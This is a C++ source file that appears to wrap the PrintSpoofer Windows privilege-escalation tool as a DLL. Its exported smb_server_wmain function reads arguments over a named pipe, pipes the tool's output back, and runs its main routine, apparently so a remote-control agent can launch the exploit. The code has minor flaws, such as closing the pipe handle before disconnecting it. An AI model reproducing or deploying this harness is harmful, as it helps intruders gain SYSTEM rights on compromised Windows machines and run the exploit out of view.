#include <io.h>
#include <fcntl.h>
#include <iostream>
#include <cstdio>
#include <Windows.h>
#include "PrintSpoofer.h"

void RedirectIO(FILE* hFrom, HANDLE hTo)
{
	int fd = _open_osfhandle((intptr_t)hTo, _O_WRONLY | _O_TEXT);
	_dup2(fd, _fileno(hFrom));
	setvbuf(hFrom, NULL, _IONBF, 0); //Disable buffering.
}


extern "C" __declspec(dllexport) int smb_server_wmain(LPVOID lpUserdata, DWORD nUserdataLen)
{
	if (nUserdataLen) {
		SIZE_T length = 14 + nUserdataLen;
		DWORD dwErr;
		char* namedPipeName = (char*)malloc(length);
		//wsprintf(namedPipeName, L"\\\\.\\pipe\\%s", (LPCWSTR)lpUserdata);
		sprintf_s(namedPipeName, length, "\\\\.\\pipe\\%s", (LPCSTR)lpUserdata);
		HANDLE hPipe = NULL;
		BOOL fSuccess;
		char buffer[1024];
		char* pt;
		wchar_t wBuffer[1024];
		DWORD dwRead;
		ZeroMemory(&buffer, sizeof(buffer));
		ZeroMemory(&wBuffer, sizeof(wBuffer));
		int argc = 0;
		wchar_t** argv;
		size_t max;
		int bytesCopied;
		int i = 0;
		NTSTATUS status = 0;
		hPipe = CreateNamedPipeA(
			namedPipeName,
			PIPE_ACCESS_DUPLEX,
			PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
			1,
			4096 * 4096,
			4096 * 4096,
			INFINITE,
			NULL);

		if (hPipe == INVALID_HANDLE_VALUE)
		{
			free(namedPipeName);
			return -1;
		}

		if (ConnectNamedPipe(hPipe, NULL) != FALSE)   // wait for someone to connect to the pipe
		{
			fSuccess = ReadFile(hPipe, buffer, sizeof(buffer) - 1, &dwRead, NULL);
			if (fSuccess == FALSE)
			{
				free(namedPipeName);
				return -1;
			}
			mbtowc(NULL, NULL, 0);  /* reset mbtowc */
			max = strlen(buffer);
			pt = buffer;
			while (max > 0) {
				bytesCopied = mbtowc(&wBuffer[i], pt, max);
				if (bytesCopied < 1) break;
				i += bytesCopied; pt += bytesCopied; max -= bytesCopied;
			}
			RedirectIO(stdout, hPipe);
			RedirectIO(stderr, hPipe);
			if (argv = CommandLineToArgvW(wBuffer, &argc))
			{
				wmain(argc, argv);
				LocalFree(argv);
			}
			printf("EOF\n");
			FlushFileBuffers(hPipe);
			CloseHandle(hPipe);
			DisconnectNamedPipe(hPipe);
		}
		free(namedPipeName);
		return status;
	}
	else {
		return -1;
	}
}